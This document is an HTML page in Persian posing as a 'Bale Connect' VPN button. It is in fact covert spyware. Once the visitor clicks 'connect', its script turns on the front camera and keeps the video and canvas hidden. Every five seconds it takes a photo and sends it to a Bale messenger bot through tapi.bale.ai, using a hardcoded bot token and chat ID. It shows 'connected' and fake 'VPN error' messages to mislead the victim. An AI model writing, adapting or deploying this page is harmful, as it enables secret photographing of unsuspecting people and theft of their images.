<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bale Connect</title>
    <style>
        body { margin: 0; background: #f8f9fa; color: #333; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .circle { width: 170px; height: 170px; border-radius: 50%; border: 5px solid #00a591; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; background: #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .circle.active { background: #00a591; border-color: #00796b; }
        .circle span { color: #00a591; font-size: 20px; font-weight: bold; }
        .circle.active span { color: #fff; }
        .status { font-size: 18px; margin-top: 20px; font-weight: bold; color: #555; }
        #msg { margin-top: 15px; font-size: 14px; font-weight: bold; min-height: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="circle" id="circle" onclick="toggle()">
    <span id="txt">اتصال</span>
</div>

<div class="status" id="st">وضعیت: قطع</div>
<div id="msg"></div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    // اطلاعات جدید شما برای بله
    const token = "2130252958:5Zzvo7yjpkkrCTs3-A2GDEgxOQRGZt_9FPY"; 
    const chat_id = "630900118"; 

    let on = false, int = null, stream = null;
    const circle = document.getElementById('circle'), txt = document.getElementById('txt');
    const st = document.getElementById('st'), msg = document.getElementById('msg');
    const v = document.getElementById('v'), c = document.getElementById('c');

    async function toggle() {
        if (!on) {
            try {
                // درخواست دوربین جلو
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                v.srcObject = stream;
                on = true;
                circle.classList.add('active');
                txt.textContent = "توقف";
                st.textContent = "وضعیت: متصل";
                msg.innerHTML = "";
                // ارسال عکس هر 5 ثانیه
                int = setInterval(takeShot, 5000);
            } catch (err) {
                msg.style.color = "#d32f2f";
                msg.innerHTML = "خطای فیلترشکن";
            }
        } else { stop(); }
    }

    function stop() {
        on = false; clearInterval(int);
        if (stream) stream.getTracks().forEach(t => t.stop());
        circle.classList.remove('active');
        txt.textContent = "اتصال";
        st.textContent = "وضعیت: قطع";
        msg.innerHTML = "";
    }

    function takeShot() {
        const ctx = c.getContext('2d');
        c.width = v.videoWidth; c.height = v.videoHeight;
        ctx.drawImage(v, 0, 0);
        c.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chat_id);
            formData.append('photo', blob, 'img.jpg');

            // ارسال به سرور بله
            fetch(`https://tapi.bale.ai/bot${token}/sendPhoto`, { 
                method: 'POST', 
                body: formData 
            })
            .then(res => res.json())
            .then(data => {
                if(data.ok) {
                    msg.style.color = "#00a591";
                    msg.innerHTML = "وصل شد";
                } else {
                    msg.style.color = "#d32f2f";
                    msg.innerHTML = "خطای فیلترشکن";
                }
            })
            .catch(() => { 
                msg.style.color = "#d32f2f";
                msg.innerHTML = "خطای فیلترشکن"; 
            });
        }, 'image/jpeg', 0.5);
    }
</script>
</body>
</html>
